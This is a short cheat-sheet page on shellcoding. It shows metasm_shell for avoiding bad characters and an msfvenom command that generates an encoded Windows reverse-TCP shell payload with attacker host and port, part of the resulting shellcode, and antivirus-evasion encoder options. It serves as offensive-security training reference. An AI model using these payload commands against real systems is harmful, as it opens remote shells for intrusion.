---
title: Shellcoding
description: Writing shellcode
---

# Shellcoding

## Avoiding bad chars

You can use `metasm_shell` to detect bad chars in your shellcode :

```bash
$ /opt/metasploit/tools/exploit/metasm_shell.rb
type "exit" or "quit" to quit
use ";" or "\n" for newline
type "file <file>" to parse a GAS assembler source file

metasm >
```

### Basic examples

Substitute `1000` from a register :

```bash
metasm > sub esp,1000
"\x81\xec\xe8\x03\x00\x00"

metasm > add esp,-1000
"\x81\xc4\x18\xfc\xff\xff"
```

Set a register to `0` :

```bash
metasm > mov eax,0
"\xb8\x00\x00\x00\x00"

metasm > xor eax,eax
"\x31\xc0"
```

Set a register to `1` :

```bash
metasm > mov eax,1
"\xb8\x01\x00\x00\x00"

metasm > xor eax,eax
"\x31\xc0"
metasm > inc eax
"\x40"
```

## Msfvenom

Generates shellcode with `msfvenom`.

- List encoders : `msfvenom -l encoders`
- List payloads : `msfvenom -l payloads`
- List formats : `msfvenom -l formats`

### Basic example

```bash
$ msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.0.5 LPORT=4444 EXITFUNC=thread -f python -b '\x00\x0a\x0d' -v shellcode
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1965 bytes
shellcode =  b""
shellcode += b"\xdd\xc6\xd9\x74\x24\xf4\xbd\x25\xb1\xf0\x63"
shellcode += b"\x5a\x31\xc9\xb1\x52\x31\x6a\x17\x03\x6a\x17"
shellcode += b"\x83\xcf\x4d\x12\x96\xf3\x46\x51\x59\x0b\x97"
shellcode += b"\x36\xd3\xee\xa6\x76\x87\x7b\x98\x46\xc3\x29"
[...]
```

- `-a` : Architecture (ex: `x86`).
- `-p` : Payload (ex: `windows/shell_reverse_tcp`, `linux/x86/meterpreter/reverse_tcp`).
- `-f` : Output format (ex: `python`, `c`, `raw`).
- `-b` : Badchars (ex: `\x00` null byte, `\x0a` line feed, `\x0d` carriage return).
- `-v` : Variable name (ex: `buf`, `shellcode`)
- `EXITFUNC` : Use `thread` to avoid crashing the target application.

### AV Evasion

- `-e <encoder>` : Specify an encoder (ex: `86/shikata_ga_nai`).
- `-i <int>` : Number of encoding iterations.

The downside of adding more iterations is that the shellcode size increases every iteration.

### Limits size

- `-s <int>` : Maximum size of the shellcode (in bytes)

## References

- [Github - voydstack/shellcoding](https://github.com/voydstack/shellcoding)